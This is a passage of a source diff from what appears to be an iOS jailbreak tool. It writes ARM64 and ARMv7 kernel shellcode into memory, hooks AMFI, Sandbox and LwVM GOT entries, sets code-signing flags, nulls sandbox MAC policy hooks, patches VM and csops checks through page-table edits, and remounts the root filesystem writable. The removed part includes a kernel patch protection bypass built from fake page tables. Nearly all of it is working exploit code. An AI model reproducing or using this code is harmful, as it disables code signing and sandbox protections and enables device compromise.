+        mpc_ops.mpo_vnode_check_setattrlist     = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist));
+        mpc_ops.mpo_vnode_check_setextattr      = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr));
+        mpc_ops.mpo_vnode_check_setflags        = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags));
+        mpc_ops.mpo_vnode_check_setmode         = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode));
+        mpc_ops.mpo_vnode_check_setowner        = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner));
+        mpc_ops.mpo_vnode_check_setutimes       = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes));
+        mpc_ops.mpo_vnode_check_stat            = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat));
+        mpc_ops.mpo_vnode_check_truncate        = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate));
+        mpc_ops.mpo_vnode_check_unlink          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink));
+        mpc_ops.mpo_file_check_mmap             = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap));
         
         if(!mpc_ops.mpo_mount_check_remount||
            !mpc_ops.mpo_vnode_check_exec||
@@ -501,7 +725,8 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
             DEBUGLog("[ERROR] Failed to read sbops!");
             goto fail;
         }
-        
+ 
+#ifdef __LP64__
         // ret/x30 reg
         proc_check_fork_ret             = KOFFSET(region, find_proc_check_fork_ret(region, kdata, ksize, mpc_ops.mpo_proc_check_fork));
         proc_check_fork_lr              = KOFFSET(region, find_proc_check_fork_lr(region, kdata, ksize, mpc_ops.mpo_proc_check_fork));
@@ -659,39 +884,101 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
             DEBUGLog("[ERROR] Failed to search ret/lr!");
             goto fail;
         }
+#endif
         
     }
     
     {
-        DEBUGLog("Sandbox __DATA.__got");
+        DEBUGLog("Sandbox __got");
         if(!(sb_PE_i_can_has_debugger_got = KOFFSET(region, find_sb_PE_i_can_has_debugger_got(region, kdata, ksize, mpc_ops.mpo_vnode_check_exec)))) goto fail;
+#ifdef __LP64__
         if(!(sb_memset_got = KOFFSET(region, find_sb_memset_got(region, kdata, ksize, mpc_ops.mpo_proc_check_fork)))) goto fail;
+#endif
+        // remount stuff
         if(!(sb_vfs_rootvnode_got = KOFFSET(region, find_sb_vfs_rootvnode_got(region, kdata, ksize, mpc_ops.mpo_mount_check_remount)))) goto fail;
     }
     
     {
         DEBUGLog("vnode");
-        vfs_rootvnode_fn = ReadAnywhere64(sb_vfs_rootvnode_got);
+        vfs_rootvnode_fn = rkptr(sb_vfs_rootvnode_got);
         if(!vfs_rootvnode_fn) {
             DEBUGLog("[ERROR] Failed to read offset!");
             goto fail;
         }
+#ifndef __LP64__
+        vfs_rootvnode_fn -= 1; // thumb
+#endif
         
         if(!(rootvnode = KOFFSET(region, find_rootvnode_offset(region, kdata, ksize, vfs_rootvnode_fn)))) goto fail;
-        rootfs_vnode = ReadAnywhere64(rootvnode);
+        rootfs_vnode = rkptr(rootvnode);
         if(!rootvnode) {
             DEBUGLog("[ERROR] Failed to read offset!");
             goto fail;
         }
     }
     
+#ifndef __LP64__
+    {
+        // armv7
+        DEBUGLog("legacy");
+        if(!(vm_fault_enter = KOFFSET(region, find_vm_fault_enter_patch(region, kdata, ksize)))) goto fail;
+        if(!(vm_map_enter = KOFFSET(region, find_vm_map_enter_patch(region, kdata, ksize)))) goto fail;
+        if(!(vm_map_protect = KOFFSET(region, find_vm_map_protect_patch(region, kdata, ksize)))) goto fail;
+        if(!(csops = KOFFSET(region, find_csops(region, kdata, ksize)))) goto fail;
+        if(!(pmap_location = KOFFSET(region, find_pmap_location(region, kdata, ksize)))) goto fail;
+        
+        kaddr_t pmap_store = rkptr(pmap_location);
+        if(!pmap_store) {
+            DEBUGLog("[ERROR] Failed to read offset!");
+            goto fail;
+        }
+        tte_virt = rkptr(pmap_store);
+        tte_phys = rkptr(pmap_store+4);
+    }
+    // search __TEXT free area
+    kaddr_t last_section = 0;
+    kaddr_t text_last = text_vmaddr + (kaddr_t)text_vmsize;
+    if(data_vmaddr == text_last) {
+        for (unsigned int i = 0; i < 4; i++) {
+            uint32_t j=0;
+            if(i==0) {
+                j = text_text_sec_addr + (kaddr_t)text_text_sec_size;
+            }
+            if(i==1) {
+                j = text_const_sec_addr + (kaddr_t)text_const_sec_size;
+            }
+            if(i==2) {
+                j = text_cstring_sec_addr + (kaddr_t)text_cstring_sec_size;
+            }
+            if(i==3) {
+                j = text_os_log_sec_addr + (kaddr_t)text_os_log_sec_size;
+            }
+            if(j > last_section) last_section = j;
+        }
+        
+        if(text_last <= (last_section+0x100)) {
+            printf("wtf?!\n");
+            last_section = 0;
+        } else {
+            last_section += 0x100;
+            last_section = (last_section & ~0xFF);
+        }
+        printf("__TEXT last: %016llx\n", (uint64_t)last_section);
+        
+    } else {
+        printf("wtf!?\n");
+        last_section = 0;
+    }
+#endif
     
     DEBUGLog("patching kernel");
+    
+#ifdef __LP64__
     /*--- shellcode ---*/
-    uint64_t shellcode = 0;
-    uint64_t ptr = 0;
-    mach_vm_allocate(tfp0, (mach_vm_address_t*)&shellcode, 0x1000, VM_FLAGS_ANYWHERE); // r-x
-    mach_vm_allocate(tfp0, (mach_vm_address_t*)&ptr, 0x1000, VM_FLAGS_ANYWHERE); // rw-
+    kaddr_t shellcode = 0;
+    kaddr_t ptr = 0;
+    mach_vm_allocate(tfp0, (mach_vm_address_t*)&shellcode, 0x1000, VM_FLAGS_ANYWHERE); // r-x region
+    mach_vm_allocate(tfp0, (mach_vm_address_t*)&ptr, 0x1000, VM_FLAGS_ANYWHERE); // rw- region
     DEBUGLog("[*] shellcode: %llx", shellcode);
     DEBUGLog("[*] ptr: %llx", ptr);
     
@@ -699,49 +986,49 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
         printLog("[AMFI] shellcode");
         // amfi
         amfiBase = shellcode + 0x200;
-        WriteAnywhere32(shellcode + 0x200, 0x580003c8); // ldr        x8, _amfi_execve_hook
-        WriteAnywhere32(shellcode + 0x204, 0xeb0803df); // cmp        x30, x8
-        WriteAnywhere32(shellcode + 0x208, 0x54000060); // b.eq       _shellcode+0x214
-        WriteAnywhere32(shellcode + 0x20c, 0x580003a8); // ldr        x8, _vnode_isreg
-        WriteAnywhere32(shellcode + 0x210, 0xd61f0100); // br         x8
+        wk32(shellcode + 0x200, 0x580003c8); // ldr        x8, _amfi_execve_hook
+        wk32(shellcode + 0x204, 0xeb0803df); // cmp        x30, x8
+        wk32(shellcode + 0x208, 0x54000060); // b.eq       _shellcode+0x214
+        wk32(shellcode + 0x20c, 0x580003a8); // ldr        x8, _vnode_isreg
+        wk32(shellcode + 0x210, 0xd61f0100); // br         x8
         
-        WriteAnywhere32(shellcode + 0x214, 0xf9400fb0); // ldr        x16, [x29, #0x18]
-        WriteAnywhere32(shellcode + 0x218, 0xb9400208); // ldr        w8, [x16]
-        WriteAnywhere32(shellcode + 0x21c, 0x32060108); // orr        w8, w8, #0x4000000
-        WriteAnywhere32(shellcode + 0x220, 0x321e0108); // orr        w8, w8, #0x4
-        WriteAnywhere32(shellcode + 0x224, 0x321d0108); // orr        w8, w8, #0x8
-        WriteAnywhere32(shellcode + 0x228, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
-        WriteAnywhere32(shellcode + 0x22c, 0xb9000208); // str        w8, [x16]
-        WriteAnywhere32(shellcode + 0x230, 0xf94007a8); // ldr        x8, [x29, #0x8]
-        WriteAnywhere32(shellcode + 0x234, 0x580002b0); // ldr        x16, ptr
-        WriteAnywhere32(shellcode + 0x238, 0xf9000208); // str        x8, [x16]
-        WriteAnywhere32(shellcode + 0x23c, 0x10000088); // adr        x8, #0x24c
-        WriteAnywhere32(shellcode + 0x240, 0xf90007a8); // str        x8, [x29, #0x8]
-        WriteAnywhere32(shellcode + 0x244, 0x580001e8); // ldr        x8, _vnode_isreg
-        WriteAnywhere32(shellcode + 0x248, 0xd61f0100); // br         x8
+        wk32(shellcode + 0x214, 0xf9400fb0); // ldr        x16, [x29, #0x18]
+        wk32(shellcode + 0x218, 0xb9400208); // ldr        w8, [x16]
+        wk32(shellcode + 0x21c, 0x32060108); // orr        w8, w8, #0x4000000
+        wk32(shellcode + 0x220, 0x321e0108); // orr        w8, w8, #0x4
+        wk32(shellcode + 0x224, 0x321d0108); // orr        w8, w8, #0x8
+        wk32(shellcode + 0x228, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
+        wk32(shellcode + 0x22c, 0xb9000208); // str        w8, [x16]
+        wk32(shellcode + 0x230, 0xf94007a8); // ldr        x8, [x29, #0x8]
+        wk32(shellcode + 0x234, 0x580002b0); // ldr        x16, ptr
+        wk32(shellcode + 0x238, 0xf9000208); // str        x8, [x16]
+        wk32(shellcode + 0x23c, 0x10000088); // adr        x8, #0x24c
+        wk32(shellcode + 0x240, 0xf90007a8); // str        x8, [x29, #0x8]
+        wk32(shellcode + 0x244, 0x580001e8); // ldr        x8, _vnode_isreg
+        wk32(shellcode + 0x248, 0xd61f0100); // br         x8
         
-        WriteAnywhere32(shellcode + 0x24c, 0xf94007f0); // ldr        x16, [sp, #0x8]
-        WriteAnywhere32(shellcode + 0x250, 0xb9400208); // ldr        w8, [x16]
-        WriteAnywhere32(shellcode + 0x254, 0x32060108); // orr        w8, w8, #0x4000000
-        WriteAnywhere32(shellcode + 0x258, 0x321e0108); // orr        w8, w8, #0x4
-        WriteAnywhere32(shellcode + 0x25c, 0x321d0108); // orr        w8, w8, #0x8
-        WriteAnywhere32(shellcode + 0x260, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
-        WriteAnywhere32(shellcode + 0x264, 0xb9000208); // str        w8, [x16]
-        WriteAnywhere32(shellcode + 0x268, 0x58000110); // ldr        x16, ptr
-        WriteAnywhere32(shellcode + 0x26c, 0xf9400210); // ldr        x16, [x16]
-        WriteAnywhere32(shellcode + 0x270, 0xd2800000); // movz       x0, #0x0
-        WriteAnywhere32(shellcode + 0x274, 0xd61f0200); // br         x16
+        wk32(shellcode + 0x24c, 0xf94007f0); // ldr        x16, [sp, #0x8]
+        wk32(shellcode + 0x250, 0xb9400208); // ldr        w8, [x16]
+        wk32(shellcode + 0x254, 0x32060108); // orr        w8, w8, #0x4000000
+        wk32(shellcode + 0x258, 0x321e0108); // orr        w8, w8, #0x4
+        wk32(shellcode + 0x25c, 0x321d0108); // orr        w8, w8, #0x8
+        wk32(shellcode + 0x260, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
+        wk32(shellcode + 0x264, 0xb9000208); // str        w8, [x16]
+        wk32(shellcode + 0x268, 0x58000110); // ldr        x16, ptr
+        wk32(shellcode + 0x26c, 0xf9400210); // ldr        x16, [x16]
+        wk32(shellcode + 0x270, 0xd2800000); // movz       x0, #0x0
+        wk32(shellcode + 0x274, 0xd61f0200); // br         x16
         
-        WriteAnywhere64(shellcode + 0x278, _amfi_execve_hook);
-        WriteAnywhere64(shellcode + 0x280, _vnode_isreg);
-        WriteAnywhere64(shellcode + 0x288, ptr);
+        wkptr(shellcode + 0x278, _amfi_execve_hook);
+        wkptr(shellcode + 0x280, _vnode_isreg);
+        wkptr(shellcode + 0x288, ptr);
     }
     
     {
         printLog("[Sandbox] shellcode");
         // sandbox
-        uint64_t shc = 0;
-        uint64_t next = 0;
+        kaddr_t shc = 0;
+        kaddr_t next = 0;
         
         shc = shellcode + 0x2a0;
         sbWriteCode(shc, proc_check_fork_lr, proc_check_fork_ret, memset_stub); next = shc; shc += 0x40;
@@ -786,48 +1073,147 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
         
         sbBase = shc;
     }
+#else
+    {   // armv7
+        // amfi_execve_hook: makes sure amfi doesn't try to kill our binaries
+        // make writable that free space on __TEXT
+        patch_page_table(tte_virt, tte_phys, (last_section & ~0xFFF));
+        
+        int i = 0;
+        wk32(last_section+i, 0x0000F8DA); i+=4; // ldr.w   r0, [sl]            @ cs_flags
+        wk32(last_section+i, 0x6080F040); i+=4; // orr     r0, r0, #0x4000000  @ CS_PLATFORM_BINARY
+        wk32(last_section+i, 0x000FF040); i+=4; // orr     r0, r0, #0x000f     @ CS_VALID | CS_ADHOC | CS_GET_TASK_ALLOW | CS_INSTALLER
+        wk32(last_section+i, 0x507CF420); i+=4; // bic     r0, r0, #0x3f00     @ clearing CS_HARD | CS_KILL | CS_CHECK_EXPIRATION | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV
+        wk32(last_section+i, 0x0000F8CA); i+=4; // str.w   r0, [sl]
+        wk16(last_section+i, 0x2000); i+=2;     // movs    r0, #0x0
+        wk16(last_section+i, 0xB006); i+=2;     // add     sp, #0x18
+        wk32(last_section+i, 0x0D00E8BD); i+=4; // pop.w   {r8, sl, fp}
+        wk16(last_section+i, 0xBDF0); i+=2;     // pop     {r4, r5, r6, r7, pc}
+    }
+#endif
+    
     printLog("[*] shellcode: DONE");
     sleep(1);
     
-    // __DATA.__got
+    // __got hook
     printLog("[*] Hooking __DATA.__got");
     {
         // LwVM
-        printLog("[LwVM] _PE_i_can_has_kernel_configuration -> isWriteProtected check bypass");
-        WriteAnywhere64(lwvm_krnl_conf_got, lwvm_jump);
+        printLog("[LwVM] _PE_i_can_has_kernel_configuration: isWriteProtected check bypass");
+        wkptr(lwvm_krnl_conf_got, lwvm_jump);
         
         // AMFI
-        printLog("[AMFI] _PE_i_can_has_debugger -> ret1 gadget");
-        WriteAnywhere64(amfi_PE_i_can_has_debugger_got, ret1_gadget);
-        printLog("[AMFI] _cs_enforcement -> ret0 gadget");
-        WriteAnywhere64(amfi_cs_enforcement_got, ret0_gadget);
-        printLog("[AMFI] _vnode_isreg -> shellcode");
-        WriteAnywhere64(amfi_vnode_isreg_got, amfiBase);
+        printLog("[AMFI] _PE_i_can_has_debugger: ret1 gadget");
+        wkptr(amfi_PE_i_can_has_debugger_got, ret1_gadget);
+        printLog("[AMFI] _cs_enforcement: ret0 gadget");
+        wkptr(amfi_cs_enforcement_got, ret0_gadget);
+        
+#ifdef __LP64__
+        printLog("[AMFI] _vnode_isreg: shellcode");
+        wkptr(amfi_vnode_isreg_got, amfiBase);
+#else
+        printLog("[AMFI] execve_hook (__TEXT patch)");
+        patch_page_table(tte_virt, tte_phys, (amfi_execve_ret & ~0xFFF));
+        uint32_t unbase_addr = amfi_execve_ret - region;
+        uint32_t unbase_shc = last_section - region;
+        uint32_t val = make_b_w(unbase_addr, unbase_shc);
+        wk32(amfi_execve_ret, val); // b.w shellcode
+#endif
         
         // Sandbox
-        printLog("[Sandbox] _PE_i_can_has_debugger -> ret1 gadget");
-        WriteAnywhere64(sb_PE_i_can_has_debugger_got, ret1_gadget);
-        printLog("[Sandbox] _memset -> shellcode");
-        WriteAnywhere64(sb_memset_got, sbBase);
+        printLog("[Sandbox] _PE_i_can_has_debugger: ret1 gadget");
+        wkptr(sb_PE_i_can_has_debugger_got, ret1_gadget);
+        
+#ifdef __LP64__
+        printLog("[Sandbox] _memset: shellcode");
+        wkptr(sb_memset_got, sbBase);
+#else
+        {
+            printf("[Sandbox] MAC policies\n");
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
+            wk32(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
+        }
+#endif
     }
     printLog("[*] DONE");
+    
+#ifndef __LP64__
+    printLog("[*] Patching kernel");
+    // KPP does not exist on 32-bit devices
+    {
+        printLog("[*] vm_fault_enter");
+        patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
+        wk16(vm_fault_enter, 0x2201);
+        
+        printLog("[*] vm_map_enter");
+        patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
+        wk32(vm_map_enter, 0xBF00BF00);
+        
+        printLog("[*] vm_map_protect");
+        patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
+        wk32(vm_map_protect, 0xBF00BF00);
+        
+        printLog("[*] csops");
+        patch_page_table(tte_virt, tte_phys, (csops & ~0xFFF));
+        wk32(csops, 0xBF00BF00);
+        
+        printLog("[AMFI] cs_enforcement_disable");
+        patch_page_table(tte_virt, tte_phys, (cs_enforcement_disable & ~0xFFF));
+        wk8(cs_enforcement_disable, 1);
+    }
+    printLog("[*] DONE");
+#endif
     
     sleep(1);
     
     {
-        // remount (kppless...)
-        vm_offset_t off = 0xd8;
-        uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
-        uint32_t v_flag = ReadAnywhere32(v_mount + 0x79);
+        // remount
+        vm_offset_t v_mount_off = 0;
+        vm_offset_t v_flag_off = 0;
+#ifdef __LP64__
+        v_mount_off = 0xd8;
+        v_flag_off = 0x79;
+#else
+        v_mount_off = 0x84;
+        v_flag_off = 0x3d;
+#endif
         
-        WriteAnywhere32(v_mount + 0x79, v_flag & ~(1 << 6));
+        kaddr_t v_mount = rkptr(rootfs_vnode + v_mount_off);
+        uint32_t v_flag = rk32(v_mount + v_flag_off);
+        
+        wk32(v_mount + v_flag_off, v_flag & ~(1 << 6));
         
         char *nmz = strdup("/dev/disk0s1s1");
         int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
-        printLog("remounting: %d", rv);
+        printf("[*] remounting: %d\n", rv);
         
-        v_mount = ReadAnywhere64(rootfs_vnode + off);
-        WriteAnywhere32(v_mount + 0x79, v_flag);
+        v_mount = rkptr(rootfs_vnode + v_mount_off);
+        wk32(v_mount + v_flag_off, v_flag);
     }
     
     printLog("[*] patched!");
@@ -839,598 +1225,23 @@ fail:
     return -1;
 }
 
-
-
-
-
-
-
-/* qwertyoruiop's KPP bypass?! */
-static uint64_t slide;
-static uint64_t gPhysBase;
-static uint64_t gVirtBase;
-static uint64_t level1_table;
-static uint64_t ttbr1_el1;
-
-static const uint64_t addr_start = 0xffffff8000000000;
-static char pagebuf[0x1000];
-
-#define RETVAL_PHYS  (0)
-#define RETVAL_VIRT  (1)
-#define TTE_GET(tte, mask) (tte & mask)
-#define TTE_SET(tte, mask, val) tte = ((tte & (~mask)) | (val & mask))
-#define TTE_SETB(tte, mask) tte = tte | mask
-#define TTE_IS_VALID_MASK 0x1
-#define TTE_IS_TABLE_MASK 0x2
-#define TTE_PHYS_VALUE_MASK 0xFFFFFFFFF000ULL
-#define TTE_BLOCK_ATTR_PXN_MASK (1ULL << 53)
-#define TTE_BLOCK_ATTR_UXN_MASK (1ULL << 54)
-
-/*-- Remapping utils for KPP bypass --*/
-static uint64_t physalloc(uint64_t size)
-{
-    uint64_t ret = 0;
-    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
-    return ret;
-}
-
-static uint64_t pagetable_lookup(uint64_t vaddr, uint64_t ttbr, bool retval)
-{
-    uint64_t level1_entry = 0;
-    
-    // get level1 entry
-    uint64_t L1_table = ttbr - gPhysBase + gVirtBase;
-    level1_entry = ReadAnywhere64(L1_table);
-    DEBUGLog("level1_entry: %llx", level1_entry);
-    
-    // read level2 (each corresponds to 2Mb)
-    uint64_t level2_base = (level1_entry & 0xfffffff000) - gPhysBase + gVirtBase;
-    uint64_t level2_table = level2_base + (((vaddr - addr_start) >> 21) << 3);
-    DEBUGLog("level2_base: %llx", level2_base);
-    DEBUGLog("level2_table: %llx", level2_table);
-    uint64_t level2_entry = ReadAnywhere64(level2_table);
-    
-    // level3, each corresponding to a 4K page
-    uint64_t level3_base = (level2_entry & 0xfffffff000) - gPhysBase + gVirtBase;
-    uint64_t level3_table = level3_base + (((vaddr & 0x1fffff) >> 12) << 3);
-    DEBUGLog("level2_entry: %llx", level2_entry);
-    DEBUGLog("level3_base: %llx", level3_base);
-    DEBUGLog("level3_table: %llx", level3_table);
-    uint64_t level3_entry = ReadAnywhere64(level3_table);
-    DEBUGLog("level3_entry: %llx", level3_entry);
-    
-    uint64_t phys = (level3_entry & 0xfffffff000);
-    if(retval == RETVAL_PHYS) return phys;
-    
-    uint64_t virt = phys - gPhysBase + gVirtBase;
-    
-    return virt;
-}
-
-static uint64_t fakepage_lookup(uint64_t addr, uint64_t ttbr1_el1_fake)
-{
-    int bk=0;
-    
-    uint64_t vaddr = addr & ~0xfff;
-    uint64_t vmask = addr & 0xfff;
-    
-    DEBUGLog("Page: %llx", vaddr);
-    
-    /*-- original pagetable --*/
-    DEBUGLog("Original Page Table");
-    uint64_t level1_table_orig = ttbr1_el1 - gPhysBase + gVirtBase;
-    uint64_t L1_PA_orig = (ReadAnywhere64(level1_table_orig) & 0xfffffff000);
-    uint64_t L2_PA_orig = (ReadAnywhere64(L1_PA_orig - gPhysBase + gVirtBase + (((vaddr - addr_start) >> 21) << 3)) & 0xfffffff000);
-    uint64_t L3_PA_orig = (ReadAnywhere64(L2_PA_orig - gPhysBase + gVirtBase + (((vaddr & 0x1fffff) >> 12) << 3)) & 0xfffffff000);
-    
-    DEBUGLog("level1_table: %llx", level1_table_orig);
-    DEBUGLog("level1 phys: %llx", L1_PA_orig);
-    DEBUGLog("level2 phys: %llx", L2_PA_orig);
-    DEBUGLog("level3 phys: %llx", L3_PA_orig);
-    /*---- end ----*/
-    
-    /*-- setting for fakepage --*/
-    uint64_t level1_table_fake = ttbr1_el1_fake - gPhysBase + gVirtBase;
-    uint64_t level1_entry = ReadAnywhere64(level1_table_fake); // fake l1 entry
-    uint64_t L1_PA = (level1_entry & 0xfffffff000); // fake L1 phys
-    
-    uint64_t level2_base = L1_PA - gPhysBase + gVirtBase;
-    
-    if(L1_PA == L1_PA_orig){
-        /*-- Remap for fakeL1 --*/
-        bzero(pagebuf, 0x1000);
-        uint64_t level1_pte = physalloc(0x1000); // Create New L2 table
-        copyin(pagebuf, level2_base, 0x1000);
-        copyout(level1_pte, pagebuf, 0x1000);
-        uint64_t level1_pte_phys = pagetable_lookup(level1_pte, ttbr1_el1_fake, RETVAL_PHYS);
-        TTE_SET(level1_entry, TTE_PHYS_VALUE_MASK, level1_pte_phys);
-        TTE_SET(level1_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
-        TTE_SET(level1_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
-        DEBUGLog("level1_entry: %llx", level1_entry);
-        WriteAnywhere64(level1_table_fake, level1_entry);
-        
-        L1_PA = (level1_entry & 0xfffffff000);
-        level2_base = L1_PA - gPhysBase + gVirtBase;
-    }
-    
-    uint64_t level2_table = level2_base + (((vaddr - addr_start) >> 21) << 3);
-    uint64_t level2_entry = ReadAnywhere64(level2_table);
-    
-    if((level2_entry & 0x3) != 0x3){
-        uint64_t fakep = physalloc(0x1000);
-        uint64_t realp = TTE_GET(level2_entry, TTE_PHYS_VALUE_MASK);
-        TTE_SETB(level2_entry, TTE_IS_TABLE_MASK);
-        for (int i = 0; i < (0x1000/8); i++) {
-            TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, realp + i * 0x1000);
-            WriteAnywhere64(fakep+i*8, level2_entry);
-        }
-        TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, pagetable_lookup(fakep, ttbr1_el1_fake, RETVAL_PHYS));
-        WriteAnywhere64(level2_table, level2_entry);
-        bk = 1;
-    }
-    
-    uint64_t L2_PA = (level2_entry & 0xfffffff000);
-    
-    uint64_t level3_base = L2_PA - gPhysBase + gVirtBase;
-    
-    if(bk == 1 || L2_PA == L2_PA_orig){
-        /*-- Remap for fakeL2 --*/
-        bzero(pagebuf, 0x1000);
-        uint64_t level2_pte = physalloc(0x1000);
-        copyin(pagebuf, level3_base, 0x1000);
-        copyout(level2_pte, pagebuf, 0x1000);
-        uint64_t level2_pte_phys = pagetable_lookup(level2_pte, ttbr1_el1_fake, RETVAL_PHYS);
-        TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, level2_pte_phys);
-        TTE_SET(level2_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
-        TTE_SET(level2_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
-        DEBUGLog("level2_entry: %llx", level2_entry);
-        WriteAnywhere64(level2_table, level2_entry);
-        
-        L2_PA = (level2_entry & 0xfffffff000);
-        level3_base = L2_PA - gPhysBase + gVirtBase;
-    }
-    
-    uint64_t level3_table = level3_base + (((vaddr & 0x1fffff) >> 12) << 3);
-    
-    uint64_t level3_entry = ReadAnywhere64(level3_table);
-    
-    if((level3_entry & 0x3) != 0x3){
-        uint64_t fakep = physalloc(0x1000);
-        uint64_t realp = TTE_GET(level3_entry, TTE_PHYS_VALUE_MASK);
-        TTE_SETB(level3_entry, TTE_IS_TABLE_MASK);
-        for (int i = 0; i < (0x1000/8); i++) {
-            TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, realp + i * 0x1000);
-            WriteAnywhere64(fakep+i*8, level3_entry);
-        }
-        TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, pagetable_lookup(fakep, ttbr1_el1_fake, RETVAL_PHYS));
-        WriteAnywhere64(level3_table, level3_entry);
-        bk = 1;
-    }
-    
-    uint64_t L3_PA = (level3_entry & 0xfffffff000);
-    
-    uint64_t page_base = L3_PA - gPhysBase + gVirtBase;
-    
-    if(bk == 1 || L3_PA == L3_PA_orig){
-        /*-- Remap for fakeL3 --*/
-        bzero(pagebuf, 0x1000);
-        uint64_t level3_pte = physalloc(0x1000);
-        copyin(pagebuf, page_base, 0x1000);
-        copyout(level3_pte, pagebuf, 0x1000);
-        uint64_t fakePage = pagetable_lookup(level3_pte, ttbr1_el1_fake, RETVAL_PHYS);
-        TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, fakePage);
-        TTE_SET(level3_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
-        TTE_SET(level3_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
-        DEBUGLog("level3_entry: %llx", level3_entry);
-        WriteAnywhere64(level3_table, level3_entry);
-        
-        L3_PA = (level3_entry & 0xfffffff000);
-        page_base = L3_PA - gPhysBase + gVirtBase;
-    }
-    
-    DEBUGLog("New_VA: %llx", page_base+vmask);
-    return page_base+vmask;
-}
-
-static void policy_patch(uint64_t ops, uint64_t ttbr){
-    uint64_t new_ops = fakepage_lookup(ops, ttbr);
-    WriteAnywhere64(new_ops, 0);
-}
-
-static int kpp9(uint64_t region, uint64_t lwvm_type)
-{
-    slide = region - 0xffffff8004004000;
-    printLog("kslide: %llx", slide);
-    
-    init_kernel(region);
-    
-    /*---- patchfinder64 ----*/
-    uint64_t entryp = kernel_entry + slide;
-    uint64_t rvbar = entryp & (~0xFFF);
-    uint64_t cpul = find_register_value(kdata, rvbar+0x54, 1); // 9.3.3, n51
-    DEBUGLog("entryp: %llx", entryp);
-    DEBUGLog("rvbar: %llx", rvbar);
-    DEBUGLog("cpul: %llx", cpul);
-    
-    uint64_t gPhysAddr = region + find_gPhysAddr(region, kdata, ksize);
-    uint64_t gVirtAddr = region + find_gVirtAddr(region, kdata, ksize);
-    
-    gPhysBase = ReadAnywhere64(gPhysAddr);
-    gVirtBase = ReadAnywhere64(gVirtAddr);
-    printLog("gPhysBase: %llx", gPhysBase);
-    printLog("gVirtBase: %llx", gVirtBase);
-    
-    uint64_t pmap_location = region + find_pmap_location(region, kdata, ksize);
-    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_location));
-    printLog("pmap_location: %llx", pmap_location);
